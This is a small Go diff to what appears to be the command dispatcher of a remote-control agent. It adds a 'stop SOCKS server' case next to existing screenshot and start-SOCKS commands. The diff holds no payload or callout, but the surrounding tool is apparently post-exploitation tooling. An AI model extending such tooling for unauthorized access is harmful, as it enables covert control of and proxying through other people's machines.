@@ -37,6 +37,8 @@ func main() {
 			resp = modules.Screenshot(cmdReq.GetScreenshotRequest())
 		case pb.START_SOCKS_CMD_TYPE:
 			resp = modules.StartSocksServer(cmdReq.GetStartSocksServerRequest(), controller.Session)
+		case pb.STOP_SOCKS_CMD_TYPE:
+			resp = modules.StopSocksServer(cmdReq.GetStopSocksServerRequest(), controller.Session)
 		}
 		err = controller.WriteCommandResponse(resp)
 		if err != nil {
